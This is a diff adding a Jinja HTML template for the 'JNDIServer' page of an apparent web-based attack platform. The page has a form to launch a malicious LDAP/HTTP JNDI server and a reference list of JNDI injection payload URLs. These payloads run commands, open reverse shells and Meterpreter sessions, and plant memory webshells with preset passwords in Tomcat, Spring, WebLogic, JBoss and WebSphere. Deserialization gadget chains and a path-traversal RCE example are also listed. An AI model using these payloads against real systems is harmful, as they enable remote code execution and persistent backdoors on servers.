@@ -1,0 +1,189 @@
+{% extends "layouts/base.html" %}
+
+{% block title %} JNDIServer模块 {% endblock %} 
+
+<!-- Specific CSS goes HERE -->
+{% block stylesheets %}{% endblock stylesheets %}
+
+{% block content %}
+
+    <!-- [ Main Content ] start -->
+    <div class="pcoded-main-container">
+        <div class="pcoded-wrapper">
+            <div class="pcoded-content">
+                <div class="pcoded-inner-content">
+                    <!-- [ breadcrumb ] start -->
+
+                    <div class="box-header with-border">
+                        {% include 'layouts/message.html' %}
+                    </div>
+
+                    <div class="page-header">
+                        <div class="page-block">
+                            <div class="row align-items-center">
+                                <div class="col-md-12">
+                                    <div class="page-header-title">
+                                        <h5 class="m-b-10">JNDIServer模块</h5>
+                                    </div>
+                                    <ul class="breadcrumb">
+                                        <li class="breadcrumb-item"><a href="/"><i class="feather icon-home"></i></a></li>
+                                        <li class="breadcrumb-item"><a href="javascript:">JNDIServer模块</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- [ breadcrumb ] end -->
+                    <div class="main-body">
+                        <div class="page-wrapper">
+                            <!-- [ Main Content ] start -->
+                             <!-- [ stiped-table ] start -->
+                             <div class="col-xl-12">
+                                <div class="card">
+                                    <div class="card-header">
+                                        <div class="row">
+                                            <div class="col-sm-6">
+                                                <h5>JNDIServer服务</h5>
+                                            </div>
+                                            
+                                            <div class="col-sm-6">
+                                                <hr>
+                                                <form class="form-inline" action="/AttackServer" method="GET">
+                                                    <div class="form-group mb-2">
+                                                        <input type="text" readonly class="form-control-plaintext" id="portinfo" value="服务开放端口(LDAP,HTTP)">
+                                                        <input type="hidden" name="id" value="{{form.attackServer_Jndi.id}}" />
+                                                        
+                                                        <div class="input-group">
+                                                            {%if form.attackServer_Jndi.serverprocess == "NONE" %}
+                                                            <input type="hidden" name="action" value="open"/>
+                                                            <input type="text" class="form-control" name="ldapport" id="ldapport" placeholder="不填随机(ldap)" />
+                                                            <input type="text" class="form-control" name="httpport" id="httpport" placeholder="不填随机(http)" />
+                                                            {% else %}
+                                                            <input type="hidden" name="action" value="close"/>
+                                                            <input type="text" class="form-control" name="ldapport" id="ldapport" disabled value="{{form.ldapport}}(ldap)" />
+                                                            <input type="text" class="form-control" name="httpport" id="httpport" disabled value="{{form.httpport}}(http)" />
+                                                            {% endif %}
+                                                           
+                                                            <div class="input-group-append">
+                                                                
+                                                                {%if form.attackServer_Jndi.serverprocess == "NONE" %}
+                                                                <button class="btn btn-primary" type="submit">开启</button>
+                                                                {%else %}
+                                                                <button class="btn btn-secondary" type="submit">关闭</button>
+                                                                {% endif %} 
+                                                            </div>
+                                                        </div>
+
+
+                                                    </div>
+                                                </form>
+                                                
+                                            </div>
+                                        </div>
+
+                                    </div>
+                                </div>
+                                <!-- [ text Content ] start -->
+
+                            <div class="row">
+                                <div class="col-sm-12">
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <h5>命令参考</h5>
+                                        </div>
+                                        <div class="card-block">
+                                            <span class="d-block m-t-5">[+] Basic Queries: ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/[PayloadType]/[Params], e.g.:<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/Dnslog/[domain]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/Command/[cmd]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/Command/Base64/[base64_encoded_cmd]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/TomcatEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/SpringEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/WeblogicEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/TomcatMemshell1<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/TomcatMemshell2  ---need extra header [shell: true]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/TomcatMemshell3  /ateam  pass1024<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/GodzillaMemshell /bteam.ico pass1024<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/JettyMemshell<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/WeblogicMemshell1<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/WeblogicMemshell2<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/JBossMemshell<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/WebsphereMemshell<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Basic/SpringMemshell<br>
+                                                    
+                                            </span>
+                                            <br>
+
+                                            <span class="d-block m-t-5">[+] TomcatBypass Queries<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/Dnslog/[domain]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/Command/[cmd]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/Command/Base64/[base64_encoded_cmd]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/TomcatEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/SpringEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/TomcatMemshell1<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/TomcatMemshell3  /ateam  pass1024<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/GodzillaMemshell /bteam.ico pass1024<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/SpringMemshell<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp<br>
+                                            </span>
+                                            <br>
+                                            
+                                            <span class="d-block m-t-5">[+] Deserialize Queries: ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/URLDNS/[domain]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/CommonsCollectionsK1/Dnslog/[domain]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port] ---windows NOT supported<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/CommonsBeanutils2/TomcatEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/C3P0/SpringEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/Jdk7u21/WeblogicEcho<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/Jre8u20/TomcatMemshell<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/CVE_2020_2555/WeblogicMemshell1<br>
+                                                    ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/Deserialization/CVE_2020_2883/WeblogicMemshell2     ---ALSO support other memshells<br>
+                                            </span>
+
+                                            <br>
+                                            <span class="d-block m-t-5">
+                                                [+] GroovyBypass Queries<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/GroovyBypass/Command/[cmd]<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/GroovyBypass/Command/Base64/[base64_encoded_cmd]<br>
+                                            <br>
+                                            [+] WebsphereBypass Queries<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/List/file=[file or directory]<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/Upload/Dnslog/[domain]<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/Upload/Command/[cmd]<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/Upload/WebsphereMemshell<br>
+                                                ldap://{{form.attackServer_Jndi.serverhost}}:{{form.ldapport}}/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp<br>
+
+                                            </span>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- [ text Content ] end -->
+
+
+                            </div>
+                            <!-- [ stiped-table ] end -->
+
+                            
+
+
+                            <!-- [ Main Content ] end -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- [ Main Content ] end -->
+
+{% endblock content %}
+
+<!-- Specific Page JS goes HERE  -->
+{% block javascripts %}
+{% endblock javascripts %}
